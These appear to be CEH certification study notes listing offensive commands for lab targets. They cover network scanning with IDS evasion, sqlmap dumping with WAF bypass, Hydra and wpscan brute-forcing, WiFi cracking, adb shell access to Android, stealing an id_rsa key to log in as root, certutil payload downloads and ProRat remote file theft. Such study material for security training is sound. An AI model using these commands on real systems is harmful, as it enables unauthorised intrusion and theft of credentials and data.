# CEH-Notes
CEH Notes
CEH-Notes
sudo netdiscover -r 192.168.1.0/24

Resource Sharing
Wget:
Single file: wget http://192.168.0.101:8000/filename -O C:\path\to\destination\filename
All files: Navigate to PasteFolder > wget -r -np -nd -A "*" http://192.168.0.101:8000/folder/

---------------------------------------------------------------------------------

SCP:
Start ssh service.
Linux: service ssh start
Windows: Settings>Apps>Optional Features>Add Feature>Install OpenSSH Server | Powershell:Start-Service sshd
File: scp /path/to/local/file username@192.168.0.104:/path/to/destination
Folder: scp -r /path/to/local/folder username@192.168.0.104:/path/to/destination/folder

---------------------------------------------------------------------------------

Python HTTP Server
cd OpenSharingFolder
python3 -m http.server 8000
Open VM, navigate to http://192.168.0.101:8000
certutil -urlcache -f http://192.168.0.101:8000/file.exe file.exe | Windows Transfer

---------------------------------------------------------------------------------

NMAP
Best
nmap -sn 192.168.1.0/24
nmap -A -T4 -p- 192.168.1.0/24
nmap -sC -sV -Pn -T4 -vv -p- 192.168.1.0/24
nmap --script vuln -Pn -T4 -p- 192.168.1.0/24

---------------------------------------------------------------------------------

Firewall/IDS, if opened
nmap -sS -v -p- 192.168.1.0/24
nmap -f -p- 192.168.1.0/24

UDP Scan
nmap -sU --top-ports 25 -p- 192.168.1.0/24

nmap --script smb-os-discovery.nse IP

---------------------------------------------------------------------------------

SQLMap
sqlmap -r req.txt -dbs
sqlmap -r req.txt -D DBName --tables
sqlmap -r req.txt -D DBName --tables --columns
sqlmap -r req.txt -D DBName --dump
WAF: sqlmap -u "https://target.com" --dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch --dump

---------------------------------------------------------------------------------

WordPress
WP SCAN
wpscan --url http://192.168.0.1
wpscan --url http://192.168.0.1 -e u #User Enum
wpscan --url http://192.168.0.1 --enumerate u
wpscan --url http://192.168.0.1 --usernames /home/user.txt --passwords(-P) /home/pass.txt
wpscan --url http://192.168.0.1 -u john --passwords /home/pass.txt

---------------------------------------------------------------------------------

METASPLOIT
msfconsole :
use auxilliary/scanner/http/wordpress_login_enum
show options
set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
set RHOSTS 192.168.0.1 (target ip)
set RPORT 8080 (target port)
set TARGETURI http://192.168.0.1:8080/
set USERNAME admin

---------------------------------------------------------------------------------

HYDRA
hydra -L /home/user.txt -P /home/pass.txt 192.168.0.1 ftp
hydra -L /home/user.txt -P /home/pass.txt ftp://192.168.0.1
hydra -L /home/user.txt -P /home/pass.txt 192.168.0.1 ssh
hydra -L /home/user.txt -P /home/pass.txt ssh://192.168.0.1
hydra -L usernames.txt -P passwords.txt -s 25 -vV 192.168.0.104 smtp

---------------------------------------------------------------------------------

STEGANOGRAPHY
SNOW (Windows)
Hide:SNOW -C -m "Hey Hacker" -p "hack" abc.txt abcd.txt
Extract:SNOW -C -p "hack" abcd.txt

OpenStego (Windows)
Click on Extract Data
Select Stego file
Select output folder
Enter password & CLick on Extract Data Button

StegHide (Linux)
Hide: steghide embed -cf cover.png -ef secret.txt -p 1234
stegcrack Extract: steghide extract -sf steg.file
Enter Password & Hit Enter

Stegcracker (Linux)
stegcracker steg.file

---------------------------------------------------------------------------------

CRYPTOGRAPHY
HashCalc (Windows)
Open File
Click on Calculate Button

VeraCrypt (Windows)
Select any Volume A,B,D,E
Select Encrypted Folder
Click on mount button
Enter Password
Open File Manager
Open Newly created drive and open secret.txt file

Crack Hash
Hash Analyzer
Hashes
CrackStation

BCTextEncoder (Windows)
Paste Hash Value
Click on Decode
Enter Password

Cryptool (Windows)
RC4:
Open File
Encrypt/Decrypt > Symmetric(modern) > RC4
Enter bit length (EX:14)
Click on Decrypt

DES(ECB):
Open File
Encrypt/Decrypt > Symmetric(modern) > DES(ECB)
Select bit length if given in qus
Click on Decrypt

---------------------------------------------------------------------------------

WireShark
For credentials: http.request.method == POST
For DoS Attack:
Statistics > IPv4 Statistics > Source and Destination Address
Apply Filter:- tcp.flags.syn == 1 and tcp.flags.ack == 0

---------------------------------------------------------------------------------

Android
Normal
nmap ip -sV -p 5555
adb connect 192.168.0.1:5555
adb shell
cd sdcard
cat secret.txt

---------------------------------------------------------------------------------

ELF
cd sdcard/scan
sudo adb pull /sdcard/scan/
ent evil.elf
sha384sum evil.elf

---------------------------------------------------------------------------------

EOL
nmap -Pn --script vuln 192.168.0.1
Copy the CVE and Paste it on Google
Check the severity | For Ex: 10

---------------------------------------------------------------------------------


FQDN
nmap -p 389 -sV -iL ip.list
nmap -p389 -sV 192.168.0.1
FQDN: DC.pentester.team

---------------------------------------------------------------------------------


WIFI
aircrack-ng cap.file
aircrak-ng -w wordlist.txt cap.file
aircrak-ng -b 2a:25:zd:54:48:as -w wordlist.txt cap.file
aircrak-ng -a2 -b 2a:25:zd:54:48:as -w wordlist.txt cap.file

---------------------------------------------------------------------------------


Privilege Escalation
Login in ssh
sudo -l
sudo -i

id_rsa
su user
cd .ssh
ls
cat id_rsa & Copy it
Paste on host Machine
chmod 600 id_rsa
ssh root@192.168.0.1 -i id_rsa -p 22

---------------------------------------------------------------------------------


Malware
ProRat
Enter Victim IP
Click on connect
Enter Password
Click on Search Files "Searching for *.txt"
Click on File Manager
Move to Secret Directory & Download the secret file

Static Analysis ELF with DIE
Open Die
Upload File
Click on File Info
